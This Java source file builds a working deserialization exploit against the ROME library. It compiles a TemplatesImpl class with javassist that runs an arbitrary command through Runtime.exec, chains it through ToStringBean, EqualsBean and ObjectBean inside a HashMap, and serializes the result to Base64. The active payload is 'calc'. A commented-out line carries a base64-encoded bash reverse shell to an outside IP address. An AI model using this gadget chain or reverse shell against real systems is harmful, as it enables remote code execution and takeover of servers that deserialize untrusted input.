import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Opcodes;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

public class Rome_shorter2 {
    public static byte[] getTemplatesImpl(String cmd) throws NotFoundException, CannotCompileException, IOException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("a");
        CtClass superClass = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = CtNewConstructor.make("    public a(){\n" +
            "        try {\n" +
            "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +
            "        }catch (Exception ignored){}\n" +
            "    }", ctClass);
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        ctClass.defrost();
        return bytes;
    }
    //使用asm技术继续缩短
    public static byte[] shorterTemplatesImpl(byte[] bytes) throws IOException {
        String path = System.getProperty("user.dir") + File.separator + "a.class"; //File.separator是分隔符
        try {
            Files.write(Paths.get(path), bytes);
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            //asm删除LINENUMBER
            byte[] allBytes = Files.readAllBytes(Paths.get(path));
            ClassReader classReader = new ClassReader(allBytes);
            ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
            int api = Opcodes.ASM9;
            ClassVisitor classVisitor = new shortClassVisitor(api, classWriter);
            int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
            classReader.accept(classVisitor, parsingOptions);
            byte[] out = classWriter.toByteArray();
            Files.write(Paths.get(path), out);
        } catch (IOException e) {
            e.printStackTrace();
        }
        byte[] bytes1 = Files.readAllBytes(Paths.get("a.class"));
        //删除class文件
        Files.delete(Paths.get("a.class"));
        return bytes1;
    }
    //因为ClassVisitor是抽象类，需要继承
    public static class shortClassVisitor extends ClassVisitor{
        private final int api;
        public shortClassVisitor(int api, ClassVisitor classVisitor){
            super(api, classVisitor);
            this.api = api;
        }
    }
    //设置属性值
    public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static String serialize(Object obj) throws IOException {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objOutput = new ObjectOutputStream(barr);
        objOutput.writeObject(obj);
        byte[] bytes = barr.toByteArray();
        objOutput.close();
        return Base64.getEncoder().encodeToString(bytes);
    }
    public static void unserialize(String code) throws IOException, ClassNotFoundException {
        byte[] decode = Base64.getDecoder().decode(code);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, NotFoundException, CannotCompileException, IOException, ClassNotFoundException {
        TemplatesImpl templates = new TemplatesImpl();
        //setFieldValue(templates, "_bytecodes", new byte[][]{getTemplatesImpl("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjQuMjA3LjEyMS84MDAwIDA+JjE=}|{base64,-d}|{bash,-i}")});
        //setFieldValue(templates, "_bytecodes", new byte[][]{shorterTemplatesImpl(getTemplatesImpl("calc"))});
        setFieldValue(templates, "_bytecodes", new byte[][]{getTemplatesImpl("calc")});
        setFieldValue(templates, "_name", "a");

        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
        ObjectBean objectBean = new ObjectBean(String.class, "a");
        HashMap hashMap = new HashMap();
        hashMap.put(null, null);
        hashMap.put(objectBean, null);

        setFieldValue(objectBean, "_equalsBean", equalsBean);
        String s = serialize(hashMap);
        System.out.println("长度为：" + s.length());
        System.out.println(s);
        unserialize(s);
    }
}
